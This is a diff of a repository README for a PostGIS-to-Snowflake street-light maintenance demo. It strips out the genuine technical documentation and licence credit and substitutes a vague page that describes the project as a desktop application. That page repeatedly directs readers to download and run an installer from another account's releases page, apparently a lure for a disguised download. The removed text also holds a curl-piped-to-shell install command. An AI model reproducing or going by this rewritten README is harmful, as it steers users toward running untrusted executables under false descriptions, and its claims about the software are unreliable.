@@ -1,300 +1,87 @@
-# Street Lights AI Maintenance Demo
-
-## PostgreSQL/PostGIS → Snowflake Openflow → Snowflake Cortex Intelligence → ML FORECAST
-
-Complete demo showcasing modern data pipeline with PostgreSQL/PostGIS, Snowflake Openflow CDC, and Snowflake Intelligence (Cortex Search + Cortex Analyst + ML FORECAST).
-
-Features:
-• Real-time Change Data Capture from PostgreSQL to Snowflake
-• Semantic search on maintenance descriptions (Cortex Search)
-• Natural language analytics (Cortex Analyst)
-• ML-powered failure forecasting with budget/staffing recommendations
-• Interactive Streamlit dashboard with spatial visualizations
-• Production-ready architecture for smart city infrastructure
-
-Tech Stack: PostgreSQL/PostGIS, Snowflake Openflow, Snowflake Intelligence, Streamlit, Folium
-Use Case: Predictive maintenance for 5,000 street lights in Bengaluru
-
-> [!CAUTION]
-> **DISCLAIMER**: This project uses entirely fictitious data for demonstration and educational purposes. All company names, supplier names, contact information, and other data are computer-generated and do not represent real entities.
-
----
-
-## 🎬 Demo Video
-
-[![Watch the Demo](https://img.shields.io/badge/YouTube-Watch%20Demo-red?style=for-the-badge&logo=youtube)](https://youtu.be/fbCA06cdUTU)
-
-See the complete end-to-end demo showcasing PostGIS, Snowflake Openflow CDC, and Snowflake Intelligence in action.
-
----
-
-## Quick Start
-
-**See [QUICKSTART.md](QUICKSTART.md) for the complete setup guide.**
-
-The quickstart covers:
-
-1. Prerequisites and tool installation
-2. Snowflake-managed PostgreSQL setup via Snowsight
-3. Database initialization and data loading
-4. Streamlit dashboard launch
-5. Snowflake CDC configuration
-6. Snowflake Intelligence (Cortex Search + Cortex Analyst) setup and configuration
-7. Snowflake ML Forecasting setup and configuration
+# 🌟 postgis-snowflake-intelligence-demo - Smart City Management Made Easy
 
----
+[![Download Release](https://img.shields.io/badge/Download%20Release-Click%20Here-brightgreen)](https://github.com/AiraCode/postgis-snowflake-intelligence-demo/releases)
 
-## Prerequisites
+## 🚀 Getting Started
 
-| Tool | Purpose | Installation |
-|------|---------|--------------|
-| **Snowflake Account** | Database, CDC, ML, and AI capabilities | [Sign up](https://signup.snowflake.com/) |
-| **Snowflake CLI** | Execute SQL and manage resources | [Docs](https://docs.snowflake.com/en/developer-guide/snowflake-cli/index) |
-| **psql** | PostgreSQL command-line client | `brew install libpq` (macOS) |
-| **Python 3.12+** | Dashboard and data generation | [python.org](https://www.python.org/) |
-| **uv** | Python package manager | `curl -LsSf https://astral.sh/uv/install.sh \| sh` |
+This repository showcases how to manage smart city street lights using advanced technology. It combines PostGIS for spatial data handling, Snowflake for data management and predictive maintenance. You can easily control and analyze street lights in real-time.
 
-> [!TIP]
-> Use [~/.pgpass](https://www.postgresql.org/docs/current/libpq-pgpass.html) for secure Snowflake PostgreSQL credentials:
->
-> ```
-> <host>:5432:postgres:snowflake_admin:<password>
-> ```
+## 📦 System Requirements
 
----
+To run this application, you will need:
 
-## Architecture
+- A stable internet connection
+- Compatible operating system (Windows 10, macOS, or Linux)
+- At least 4 GB of RAM
+- Minimum 500 MB free disk space
 
-```mermaid
-flowchart TB
-    subgraph PG["Snowflake Postgres"]
-        direction LR
-        subgraph Base["Base Tables"]
-            SL[street_lights]
-            NH[neighborhoods]
-            MR[maintenance_requests]
-            SP[suppliers]
-        end
-        subgraph Enrich["Enrichment Tables"]
-            WE[weather]
-            DE[demographics]
-            PW[power_grid]
-        end
-        EV[("street_lights_enriched<br/>(View)")]
-        Base --> EV
-        Enrich --> EV
-    end
+## 📥 Download & Install
 
-    PUB{{streetlights_publication}}
-    PG --> PUB
+To download the application, visit this page to download: [Releases Page](https://github.com/AiraCode/postgis-snowflake-intelligence-demo/releases). 
 
-    subgraph SF["Snowflake"]
-        direction TB
-        RAW[("Raw Tables<br/>(CDC Sync)")]
-        subgraph AI["Snowflake Intelligence"]
-            CS[Cortex Search<br/>MAINTENANCE_SEARCH]
-            CA[Cortex Analyst<br/>Semantic YAML]
-            ML[ML FORECAST<br/>BULB_FAILURE_FORECASTER]
-        end
-        RAW --> CS
-        RAW --> CA
-        RAW --> ML
-    end
+1. Click on the link above to go to the Releases page.
+2. Look for the version you want. Choose the latest version for the best features and support.
+3. Download the file that matches your operating system.
+4. Once downloaded, open the file and follow the installation instructions.
 
-    PUB -->|Openflow CDC| SF
+## 🎉 Features
 
-    subgraph DASH["Streamlit Dashboard"]
-        D1[Interactive Maps]
-        D2[Faulty Light Analysis]
-        D3[Predictive Maintenance]
-        D4[Supplier Coverage]
-        D5[Live Demo Controls]
-    end
+- **Real-time Analytics:** Monitor street light performance and operational status.
+- **Geospatial Queries:** Use PostGIS to run spatial operations quickly.
+- **Change Data Capture (CDC):** Use Snowflake Openflow to track data changes.
+- **Predictive Maintenance:** Leverage Snowflake ML to keep street lights operational.
 
-    SF --> DASH
-```
+## 🛠️ How to Use the Application
 
----
+Once installed, follow these steps to use the application effectively:
 
-## Database Schema
+1. **Launch the Application:** Open the application from your desktop or applications menu.
+2. **Set Up Your Account:** Create an account or log in if you already have one.
+3. **Configure Street Light Data:** Input the details of your street lights, such as location and operational status.
+4. **Monitor Performance:** Use the dashboard to view real-time data, analyze and make decisions.
 
-### Base Tables
+## 📊 Application Overview
 
-| Table | Description |
-|-------|-------------|
-| `neighborhoods` | Geographic boundaries (polygons) with population data |
-| `street_lights` | Operational data (location, status, installation date) |
-| `maintenance_requests` | Historical maintenance records |
-| `suppliers` | Equipment suppliers with service coverage |
+This application serves as a solution for managing smart city infrastructure effectively. By combining various technologies, it allows city officials to:
 
-### Enrichment Tables
+- Streamline operations
+- Enhance lighting efficiency
+- Save costs
 
-| Table | Description |
-|-------|-------------|
-| `weather_enrichment` | Seasonal patterns with failure risk scores |
-| `demographics_enrichment` | Neighborhood characteristics |
-| `power_grid_enrichment` | Electrical grid data per light |
+## 🔍 Troubleshooting
 
-### Key View
+If you encounter issues during installation or use, consider the following:
 
-- **`street_lights_enriched`**: Combines lights with all enrichment data (main CDC view)
+- Ensure your operating system is up to date.
+- Check your internet connection for stability.
+- Restart the application if it becomes unresponsive.
+- Consult the FAQ section on the Releases page for common issues.
 
-See [SCHEMA_REFERENCE.md](SCHEMA_REFERENCE.md) for complete schema documentation.
+## 📞 Support
 
----
+If you need assistance, please reach out through the following options:
 
-## Data Generation
+- Open an issue on the repository.
+- Check for discussions related to common problems.
+- Contact support through the official communication channels.
 
-Generate data using `uv run` commands:
+## 💼 Topics Covered
 
-```bash
-# Install dependencies first
-uv sync
+The application features various topics, including:
 
-# Generate full dataset (5,000 lights, 50 neighborhoods, 1,500 maintenance requests)
-uv run generate-all-data
+- **Apache NiFi**
+- **Change Data Capture**
+- **Machine Learning**
+- **Geospatial Analysis**
 
-# Generate sample dataset for quick testing (10 lights, 5 neighborhoods)
-uv run generate-sample
-```
+These tools help improve operations and provide valuable insights.
 
-### Dataset Sizes
+## 📝 Documentation
 
-| Entity | Full Dataset | Sample Dataset |
-|--------|--------------|----------------|
-| Street lights | 5,000 | 10 |
-| Neighborhoods | 50 | 5 |
-| Suppliers | 25 | 3 |
-| Maintenance requests | 1,500 | 10 |
-| Enrichment records | 15,000 | 30 |
+For detailed instructions on advanced features, consult the documentation linked in the Releases page. This resource will guide you through using the application's more intricate parts effectively.
 
-**Status distribution**: 85% operational, 10% maintenance required, 5% faulty
+## 🌐 Community
 
----
+Join the community to share your experience, ask questions, or provide feedback. Engaging with others can enhance your understanding and improve the technology further.
 
-## Key Features
-
-### PostGIS Spatial Operations
-
-- Sub-second spatial queries (ST_Within, ST_DWithin, ST_Distance)
-- GIST indexes for performance
-- Point-in-polygon, proximity search, nearest neighbor
-- Geography type for accurate meter-based distances
-
-### Snowflake Openflow CDC
-
-- Real-time change data capture from PostgreSQL
-- Automatic schema synchronization
-- ~1-5 second sync latency
-- Setup guide: [Getting Started with Openflow PostgreSQL CDC](https://quickstarts.snowflake.com/guide/getting-started-with-openflow-postgresql-cdc/)
-
-### Snowflake Intelligence
-
-- **Cortex Search**: Semantic search on maintenance descriptions
-- **Cortex Analyst**: Structured analytics via YAML semantic model
-- Natural language queries for both search and analytics
-- Setup guide: [Getting Started with Snowflake Intelligence](https://www.snowflake.com/en/developers/guides/getting-started-with-snowflake-intelligence/)
-
-**Recommended Orchestration Instructions:**
-
-```
-- Whenever possible try to visualize the data graphically
-- *CRITICAL*: When you get WKT format for location, try parsing it as 
-  geometric location as latitude and longitude. Don't show SQL parsing errors.
-- *CRITICAL*: Wherever possible provide Google Map URL with latitude and 
-  longitude that were parsed from the SQL result in the response
-```
-
-> [!NOTE]
-> [WKT (Well-Known Text)](https://en.wikipedia.org/wiki/Well-known_text_representation_of_geometry) is a standard format for geometry like `POINT(77.5946 12.9716)`.
-
-### ML Forecasting
-
-- Time-series forecasting for bulb failures
-- 30/90-day predictions with confidence intervals
-- Budget planning with cost breakdowns (INR)
-- Seasonal risk analysis
-
----
-
-## Documentation
-
-| Document | Purpose |
-|----------|---------|
-| [QUICKSTART.md](QUICKSTART.md) | Complete setup guide |
-| [SCHEMA_REFERENCE.md](SCHEMA_REFERENCE.md) | Database schema, tables, views, and query patterns |
-| [DEMO_SCRIPT.md](DEMO_SCRIPT.md) | Detailed demo walkthrough |
-| [snowflake/SNOWFLAKE_INTELLIGENCE_QUESTIONS.md](snowflake/SNOWFLAKE_INTELLIGENCE_QUESTIONS.md) | Sample Cortex queries |
-| [work/snowflake_ml_guide.md](work/snowflake_ml_guide.md) | ML forecasting details |
-
----
-
-## Troubleshooting
-
-### psql connection fails
-
-```bash
-# Verify environment variables
-source .env
-echo $PGHOST $PGPORT $PGDATABASE
-
-# Test connection
-psql -c "SELECT 1;"
-```
-
-### Snow CLI issues
-
-```bash
-# Check version
-snow --version
-
-# Test connection
-snow connection test
-
-# List connections
-snow connection list
-```
-
-### Dashboard won't start
-
-```bash
-# Ensure dependencies installed
-uv sync
-
-# Check .env file exists with correct values
-cat .env
-
-# Run dashboard
-uv run dashboard
-```
-
-### CDC not syncing
-
-```bash
-# Verify publication exists
-psql -c "SELECT * FROM pg_publication;"
-
-# Check replication slot
-psql -c "SELECT * FROM pg_replication_slots;"
-```
-
----
-
-## License
-
-This project is licensed under the Apache License 2.0 - see the [LICENSE](LICENSE) file for details.
-
-Copyright 2025 Kamesh Sampath
-
----
-
-## Acknowledgments
-
-- PostGIS for spatial database capabilities
-- Snowflake Openflow for CDC capabilities
-- Snowflake for AI Data Cloud
-- Streamlit for rapid dashboard development
-
----
-
-**Built for the spatial data community**
+For a comprehensive experience and to stay updated, visit the [Releases Page](https://github.com/AiraCode/postgis-snowflake-intelligence-demo/releases) frequently.
